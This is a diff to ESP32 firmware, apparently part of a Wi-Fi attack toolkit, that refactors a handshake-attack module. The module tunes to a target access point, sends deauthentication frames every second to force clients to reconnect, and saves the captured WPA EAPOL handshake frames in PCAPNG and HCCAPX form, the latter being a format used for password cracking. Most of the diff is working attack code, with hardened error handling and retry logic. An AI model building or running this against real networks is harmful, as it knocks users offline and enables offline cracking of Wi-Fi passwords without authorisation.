@@ -23,7 +23,6 @@
 #include "freertos/FreeRTOS.h"
 #include "freertos/task.h"
 
-#include "frame_analyzer.h"
 #include "frame_analyzer_parser.h"
 #include "pcap_serializer.h"
 #include "hccapx_serializer.h"
@@ -125,17 +124,7 @@ static void deauth_timer_callback(void *arg) {
     send_deauth_frame();
 }
 
-/**
- * @brief Callback for DATA_FRAME_EVENT_EAPOLKEY_FRAME event.
- * 
- * If EAPOL-Key frame is captured and DATA_FRAME_EVENT_EAPOLKEY_FRAME event is received from event pool, this method
- * appends the frame and serializes them into PCAPNG and HCCAPX format.
- * 
- * @param args not used
- * @param event_base expects FRAME_ANALYZER_EVENTS
- * @param event_id expects DATA_FRAME_EVENT_EAPOLKEY_FRAME
- * @param event_data expects wifi_promiscuous_pkt_t
- */
+/** @brief Processes target EAPOL frames on the bounded sniffer worker. */
 static uint32_t eapol_frame_count = 0;
 
 /**
@@ -143,73 +132,8 @@ static uint32_t eapol_frame_count = 0;
  * 
  * @return 1-4 for M1-M4, or 0 if unknown/invalid
  */
-static uint8_t get_eapol_message_number(data_frame_t *frame) {
-    eapol_packet_t *eapol = parse_eapol_packet(frame);
-    if (!eapol) {
-        ESP_LOGI(TAG, "  DEBUG: Failed to parse EAPOL packet");
-        return 0;
-    }
-    
-    eapol_key_packet_t *eapol_key = parse_eapol_key_packet(eapol);
-    if (!eapol_key) {
-        ESP_LOGI(TAG, "  DEBUG: Failed to parse EAPOL-Key packet");
-        return 0;
-    }
-    
-    // Read Key Information as uint16_t (little-endian)
-    uint16_t key_info_raw;
-    memcpy(&key_info_raw, &eapol_key->key_information, sizeof(key_info_raw));
-    
-    // Extract flags from raw value (little-endian byte order)
-    // Key Information structure in network byte order:
-    // Byte 0 (low):  [Key Descriptor Version:3][Key Type:1][reserved:2][Install:1][Key ACK:1]
-    // Byte 1 (high): [Key MIC:1][Secure:1][Error:1][Request:1][Encrypted Key Data:1][SMK Message:1][reserved:2]
-    
-    // But ESP32 is little-endian, so we read bytes swapped
-    uint8_t byte0 = (key_info_raw >> 8) & 0xFF;  // High byte in little-endian = low byte in big-endian
-    uint8_t byte1 = key_info_raw & 0xFF;         // Low byte in little-endian = high byte in big-endian
-    
-    bool key_ack = (byte0 & 0x80) != 0;     // Bit 7 of byte 0
-    bool install = (byte0 & 0x40) != 0;     // Bit 6 of byte 0
-    bool key_mic = (byte1 & 0x01) != 0;     // Bit 0 of byte 1
-    bool secure = (byte1 & 0x02) != 0;      // Bit 1 of byte 1
-    
-    ESP_LOGI(TAG, "  Key Info=0x%04x ACK=%d Install=%d MIC=%d Secure=%d",
-             key_info_raw, key_ack, install, key_mic, secure);
-    
-    // Determine message number by flags
-    // M1: ACK=1, Install=0, MIC=0
-    if (key_ack && !install && !key_mic) {
-        ESP_LOGI(TAG, "  → Detected M1 (ACK=1, Install=0, MIC=0)");
-        return 1;
-    }
-    // M2: ACK=0, MIC=1, has SNonce
-    else if (!key_ack && key_mic && !install) {
-        // Check if has SNonce (M2) or not (M4)
-        bool has_nonce = false;
-        for (int i = 0; i < 16; i++) {
-            if (eapol_key->key_nonce[i] != 0) {
-                has_nonce = true;
-                break;
-            }
-        }
-        if (has_nonce) {
-            ESP_LOGI(TAG, "  → Detected M2 (ACK=0, MIC=1, has SNonce)");
-            return 2;
-        } else {
-            ESP_LOGI(TAG, "  → Detected M4 (ACK=0, MIC=1, no SNonce)");
-            return 4;
-        }
-    }
-    // M3: ACK=1, Install=1, MIC=1
-    else if (key_ack && install && key_mic) {
-        ESP_LOGI(TAG, "  → Detected M3 (ACK=1, Install=1, MIC=1)");
-        return 3;
-    }
-    
-    ESP_LOGW(TAG, "  → Unknown combo: ACK=%d Install=%d MIC=%d", 
-             key_ack, install, key_mic);
-    return 0; // Unknown
+static uint8_t get_eapol_message_number(const frame_view_t *view) {
+    return frame_view_eapol_message(view);
 }
 
 /**
@@ -217,8 +141,8 @@ static uint8_t get_eapol_message_number(data_frame_t *frame) {
  * 
  * Captures beacon frame from target AP to include ESSID in PCAPNG.
  */
-static void mgmt_frame_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
-    wifi_promiscuous_pkt_t *frame = (wifi_promiscuous_pkt_t *) event_data;
+static void mgmt_frame_handler(const wifi_promiscuous_pkt_t *frame, void *ctx) {
+    (void)ctx;
     if (frame->rx_ctrl.sig_len <= 28) return;
     unsigned capture_len = frame->rx_ctrl.sig_len - 4U;
     uint8_t subtype = frame->payload[0] >> 4;
@@ -229,37 +153,42 @@ static void mgmt_frame_handler(void *args, esp_event_base_t event_base, int32_t 
     }
 
     const char *label = NULL;
+    bool *captured_flag = NULL;
     if ((subtype == 8 || subtype == 5) && !captured_beacon) {
-        captured_beacon = true;
+        captured_flag = &captured_beacon;
         label = "BEACON/PROBE RESPONSE";
     } else if (subtype == 11 && !captured_authentication) {
-        captured_authentication = true;
+        captured_flag = &captured_authentication;
         label = "AUTHENTICATION";
     } else if ((subtype == 0 || subtype == 2) && !captured_association) {
-        captured_association = true;
+        captured_flag = &captured_association;
         label = "ASSOCIATION REQUEST";
     } else {
         return;
     }
 
     // ESP-IDF promiscuous sig_len includes the trailing four-byte FCS.
-    pcap_serializer_append_frame_radio(frame->payload,
-                                       capture_len,
-                                       frame->rx_ctrl.timestamp,
-                                       frame->rx_ctrl.channel,
-                                       frame->rx_ctrl.rssi);
+    if (!pcap_serializer_append_frame_radio(frame->payload, capture_len,
+                                            (uint64_t)frame->rx_ctrl.timestamp,
+                                            frame->rx_ctrl.channel, frame->rx_ctrl.rssi)) {
+        ESP_LOGW(TAG, "PCAP append failed; %s remains eligible for retry", label);
+        return;
+    }
+    *captured_flag = true;
     ESP_LOGI(TAG, "✓ %s captured and saved (ESSID: %s)", label,
              current_ap_record.ssid);
 }
 
-static void eapolkey_frame_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
+static void eapolkey_frame_handler(const wifi_promiscuous_pkt_t *frame, void *ctx) {
+    (void)ctx;
+    if (!frame || frame->rx_ctrl.sig_len <= 4) return;
+    frame_view_t view;
+    if (!frame_view_parse(frame->payload, frame->rx_ctrl.sig_len - 4U, &view) ||
+        !view.eapol_key || !frame_view_bssid_matches(&view, current_ap_record.bssid)) return;
     eapol_frame_count++;
     
-    wifi_promiscuous_pkt_t *frame = (wifi_promiscuous_pkt_t *) event_data;
-    data_frame_t *data_frame = (data_frame_t *) frame->payload;
-    
     // Determine which message this is
-    uint8_t msg_num = get_eapol_message_number(data_frame);
+    uint8_t msg_num = get_eapol_message_number(&view);
     
     ESP_LOGI(TAG, ">>> EAPoL-Key frame #%lu captured (M%d) <<<", 
              (unsigned long)eapol_frame_count, msg_num);
@@ -268,22 +197,18 @@ static void eapolkey_frame_handler(void *args, esp_event_base_t event_base, int3
     bool should_save_to_pcapng = false;
     
     if (msg_num == 1 && !captured_m1) {
-        captured_m1 = true;
         should_save_to_pcapng = true;
         ESP_LOGI(TAG, "  ✓ M1 (ANonce from AP) - SAVED to PCAPNG");
     }
     else if (msg_num == 2 && !captured_m2) {
-        captured_m2 = true;
         should_save_to_pcapng = true;
         ESP_LOGI(TAG, "  ✓ M2 (SNonce from STA + MIC) - SAVED to PCAPNG");
     }
     else if (msg_num == 3 && !captured_m3) {
-        captured_m3 = true;
         should_save_to_pcapng = true;
         ESP_LOGI(TAG, "  ✓ M3 (ANonce + Install) - SAVED to PCAPNG");
     }
     else if (msg_num == 4 && !captured_m4) {
-        captured_m4 = true;
         should_save_to_pcapng = true;
         ESP_LOGI(TAG, "  ✓ M4 (Final ACK) - SAVED to PCAPNG");
     }
@@ -296,17 +221,24 @@ static void eapolkey_frame_handler(void *args, esp_event_base_t event_base, int3
     
     // Save to PCAPNG only if unique. The driver length includes the FCS.
     if (should_save_to_pcapng && frame->rx_ctrl.sig_len > 4) {
-        pcap_serializer_append_frame_radio(frame->payload,
-                                           frame->rx_ctrl.sig_len - 4U,
-                                           frame->rx_ctrl.timestamp,
-                                           frame->rx_ctrl.channel,
-                                           frame->rx_ctrl.rssi);
-        handshake_frame_count++;
+        if (pcap_serializer_append_frame_radio(frame->payload,
+                                               frame->rx_ctrl.sig_len - 4U,
+                                               (uint64_t)frame->rx_ctrl.timestamp,
+                                               frame->rx_ctrl.channel,
+                                               frame->rx_ctrl.rssi)) {
+            handshake_frame_count++;
+            if (msg_num == 1) captured_m1 = true;
+            else if (msg_num == 2) captured_m2 = true;
+            else if (msg_num == 3) captured_m3 = true;
+            else if (msg_num == 4) captured_m4 = true;
+        } else {
+            ESP_LOGW(TAG, "PCAP append failed; M%u remains eligible for retry", msg_num);
+        }
         ESP_LOGI(TAG, "  → Total unique frames in PCAPNG: %d/4", handshake_frame_count);
     }
     
     // Always process for HCCAPX (it has its own logic)
-    hccapx_serializer_add_frame(data_frame);
+    hccapx_serializer_add_frame(&view);
     
     // Show current handshake status
     hccapx_t *hccapx = (hccapx_t *)hccapx_serializer_get();
@@ -323,6 +255,7 @@ static void eapolkey_frame_handler(void *args, esp_event_base_t event_base, int3
 }
 
 void attack_handshake_start(const wifi_ap_record_t *ap_record, attack_handshake_methods_t attack_method){
+    if (!ap_record) return;
     if (attack_running) {
         ESP_LOGW(TAG, "Handshake attack already running, stopping previous attack first");
         attack_handshake_stop();
@@ -372,12 +305,19 @@ void attack_handshake_start(const wifi_ap_record_t *ap_record, attack_handshake_
     memcpy(&current_ap_record, ap_record, sizeof(wifi_ap_record_t));
     
     // Initialize serializers with proper SSID length
-    pcap_serializer_init();
+    if (!pcap_serializer_init()) {
+        ESP_LOGE(TAG, "PCAP serializer initialization failed");
+        return;
+    }
     hccapx_serializer_init(ap_record->ssid, ssid_len);
     
     // Set channel BEFORE enabling promiscuous mode
     ESP_LOGI(TAG, "Setting channel to %d", ap_record->primary);
-    esp_wifi_set_channel(ap_record->primary, WIFI_SECOND_CHAN_NONE);
+    esp_err_t err = esp_wifi_set_channel(ap_record->primary, WIFI_SECOND_CHAN_NONE);
+    if (err != ESP_OK) {
+        ESP_LOGE(TAG, "Failed to set capture channel %u: %s", ap_record->primary, esp_err_to_name(err));
+        goto start_failed;
+    }
     
     // Give ESP32 time to switch channel (important!)
     vTaskDelay(pdMS_TO_TICKS(100));
@@ -385,27 +325,38 @@ void attack_handshake_start(const wifi_ap_record_t *ap_record, attack_handshake_
     // Verify channel was set
     uint8_t current_channel;
     wifi_second_chan_t second_chan;
-    esp_wifi_get_channel(&current_channel, &second_chan);
+    err = esp_wifi_get_channel(&current_channel, &second_chan);
+    if (err != ESP_OK || current_channel != ap_record->primary) {
+        ESP_LOGE(TAG, "Capture channel readback failed (requested %u, actual %u): %s",
+                 ap_record->primary, current_channel, esp_err_to_name(err));
+        goto start_failed;
+    }
     ESP_LOGI(TAG, "Current channel after set: %d (requested: %d)", current_channel, ap_record->primary);
     
     // Initialize sniffer
-    sniffer_init();
-    
-    // Start sniffer (capture both DATA and MGMT frames)
-    esp_wifi_set_promiscuous(true);
-    
-    // Verify channel again after promiscuous mode
-    esp_wifi_get_channel(&current_channel, &second_chan);
-    ESP_LOGI(TAG, "Current channel after promiscuous mode: %d", current_channel);
-    
+    err = sniffer_set_frame_handler(WIFI_PKT_DATA, &eapolkey_frame_handler, NULL);
+    if (err != ESP_OK) goto start_failed;
+    err = sniffer_set_frame_handler(WIFI_PKT_MGMT, &mgmt_frame_handler, NULL);
+    if (err != ESP_OK) {
+        sniffer_set_frame_handler(WIFI_PKT_DATA, NULL, NULL);
+        goto start_failed;
+    }
+    err = sniffer_init();
+    if (err != ESP_OK) {
+        esp_err_t cleanup_err = sniffer_stop(3000);
+        if (cleanup_err != ESP_OK) {
+            method = attack_method;
+            attack_running = true; /* keep a retry path while the worker retains its pool */
+            ESP_LOGE(TAG, "Sniffer startup cleanup pending: %s", esp_err_to_name(cleanup_err));
+            return;
+        }
+        sniffer_set_frame_handler(WIFI_PKT_DATA, NULL, NULL);
+        sniffer_set_frame_handler(WIFI_PKT_MGMT, NULL, NULL);
+        ESP_LOGE(TAG, "Legacy sniffer could not start: %s", esp_err_to_name(err));
+        goto start_failed;
+    }
+
     ESP_LOGI(TAG, "Waiting for BEACON frame from target AP...");
-    
-    // Start frame analyzer
-    frame_analyzer_capture_start(SEARCH_HANDSHAKE, ap_record->bssid);
-    
-    // Register handlers for both EAPOL and MGMT frames
-    ESP_ERROR_CHECK(esp_event_handler_register(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_EAPOLKEY_FRAME, &eapolkey_frame_handler, NULL));
-    ESP_ERROR_CHECK(esp_event_handler_register(SNIFFER_EVENTS, SNIFFER_EVENT_CAPTURED_MGMT, &mgmt_frame_handler, NULL));
     
     attack_running = true;
     
@@ -423,8 +374,13 @@ void attack_handshake_start(const wifi_ap_record_t *ap_record, attack_handshake_
                 .arg = NULL,
                 .name = "deauth_timer"
             };
-            ESP_ERROR_CHECK(esp_timer_create(&deauth_timer_args, &deauth_timer_handle));
-            ESP_ERROR_CHECK(esp_timer_start_periodic(deauth_timer_handle, 1000000)); // 1 second - aggressive!
+            err = esp_timer_create(&deauth_timer_args, &deauth_timer_handle);
+            if (err == ESP_OK) err = esp_timer_start_periodic(deauth_timer_handle, 1000000);
+            if (err != ESP_OK) {
+                if (deauth_timer_handle) { esp_timer_delete(deauth_timer_handle); deauth_timer_handle = NULL; }
+                attack_handshake_stop();
+                return;
+            }
             break;
             
         case ATTACK_HANDSHAKE_METHOD_PASSIVE:
@@ -437,6 +393,11 @@ void attack_handshake_start(const wifi_ap_record_t *ap_record, attack_handshake_
     }
     
     ESP_LOGI(TAG, "Handshake attack started. Listening for WPA handshake...");
+    return;
+
+start_failed:
+    pcap_serializer_deinit();
+    ESP_LOGE(TAG, "Handshake capture setup failed; no capture was started");
 }
 
 void attack_handshake_stop(){
@@ -465,23 +426,14 @@ void attack_handshake_stop(){
             ESP_LOGE(TAG, "Unknown attack method! Attack may not be stopped properly.");
     }
     
-    // Stop frame analyzer
-    frame_analyzer_capture_stop();
-    
-    // Unregister event handlers (ignore ESP_ERR_NOT_FOUND if already unregistered)
-    esp_err_t err;
-    err = esp_event_handler_unregister(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_EAPOLKEY_FRAME, &eapolkey_frame_handler);
-    if (err != ESP_OK && err != ESP_ERR_NOT_FOUND) {
-        ESP_LOGE(TAG, "Failed to unregister EAPOL handler: %s", esp_err_to_name(err));
+    // Stop and retire the PSRAM-backed sniffer worker before releasing capture state.
+    esp_err_t sniffer_err = sniffer_stop(3000);
+    if (sniffer_err != ESP_OK) {
+        ESP_LOGE(TAG, "Sniffer cleanup pending: %s; capture ownership retained", esp_err_to_name(sniffer_err));
+        return;
     }
-    
-    err = esp_event_handler_unregister(SNIFFER_EVENTS, SNIFFER_EVENT_CAPTURED_MGMT, &mgmt_frame_handler);
-    if (err != ESP_OK && err != ESP_ERR_NOT_FOUND) {
-        ESP_LOGE(TAG, "Failed to unregister MGMT handler: %s", esp_err_to_name(err));
-    }
-    
-    // Stop sniffer
-    esp_wifi_set_promiscuous(false);
+    sniffer_set_frame_handler(WIFI_PKT_DATA, NULL, NULL);
+    sniffer_set_frame_handler(WIFI_PKT_MGMT, NULL, NULL);
     
     method = -1;
     attack_running = false;
